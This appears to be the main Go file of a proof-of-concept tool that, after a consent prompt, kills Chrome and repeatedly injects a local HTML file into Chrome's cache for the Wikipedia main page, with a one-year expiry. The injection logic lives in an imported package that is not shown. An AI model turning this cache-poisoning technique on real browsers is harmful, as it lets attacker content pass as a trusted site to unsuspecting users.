package main 

import (
	"fmt"
	"time"
	"strings"
	"io/ioutil"
	"os/exec"

	"chrome-poc/injector"
)

const (
	TestHtmlFilePath = "./test-files/test.html"
)

func readFile(path string) string {
	fileData, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}
	return string(fileData)
}

func killProc(name string) {
	exec.Command("pkill", "-SIGKILL", name).Run()
}

func checkUserApproval() bool {
	fmt.Printf(
		"Do you want to inject code from %v into web pages in Chrome? yes/no\n", 
		TestHtmlFilePath,
	)

	var input string
    fmt.Scanln(&input)

	return strings.ToLower(input) == "yes"
}

func main() {
	fmt.Print("Chrome POC demo\n")

	if !checkUserApproval() {
		fmt.Print("Exiting...\n")
		return
	}

	testContent := readFile(TestHtmlFilePath)

	chromeInjector := injector.ChromeInjector{}
	chromeInjector.ExpireDate = time.Now().Add(time.Hour * 24 * 365)
	chromeInjector.Urls = []string{
		"https://en.wikipedia.org/wiki/Main_Page",
	}
	chromeInjector.Content = testContent
	chromeInjector.ContentType = "text/html"

	killProc("Chrome")

	for {
		fmt.Print("\nInjecting cache data...\n")

		chromeInjector.Inject()

		time.Sleep(5 * time.Second)
	}
}